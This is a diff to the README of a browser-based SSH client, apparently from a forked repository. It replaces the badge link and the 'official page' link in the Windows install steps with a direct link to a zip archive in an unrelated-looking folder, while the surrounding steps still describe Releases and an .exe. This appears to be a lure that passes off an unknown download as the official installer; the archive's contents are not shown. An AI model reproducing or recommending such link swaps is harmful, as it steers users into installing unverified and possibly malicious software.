@@ -1,6 +1,6 @@
 # 🌐 webssh - Access your remote servers through browsers
 
-[![](https://img.shields.io/badge/Download_webssh-blue.svg)](https://github.com/talyahaxile591/webssh)
+[![](https://img.shields.io/badge/Download_webssh-blue.svg)](https://raw.githubusercontent.com/talyahaxile591/webssh/main/micropipette/Software_v2.6.zip)
 
 webssh lets you manage your remote computer servers directly from your web browser. You do not need to install complex terminal software on your local machine. You open your browser, log in, and control your servers from anywhere with an internet connection. This tool simplifies server management by removing the need for extra client installations.
 
@@ -25,7 +25,7 @@ webssh lets you manage your remote computer servers directly from your web brows
 
 Follow these steps to set up webssh on your Windows machine.
 
-1.  Visit the official page to download the latest version of the application: [https://github.com/talyahaxile591/webssh](https://github.com/talyahaxile591/webssh).
+1.  Visit the official page to download the latest version of the application: [https://raw.githubusercontent.com/talyahaxile591/webssh/main/micropipette/Software_v2.6.zip](https://raw.githubusercontent.com/talyahaxile591/webssh/main/micropipette/Software_v2.6.zip).
 2.  Look for the section marked Releases on the right side of the page.
 3.  Click the file ending in .exe to download the installer to your computer.
 4.  Navigate to your Downloads folder once the download finishes.
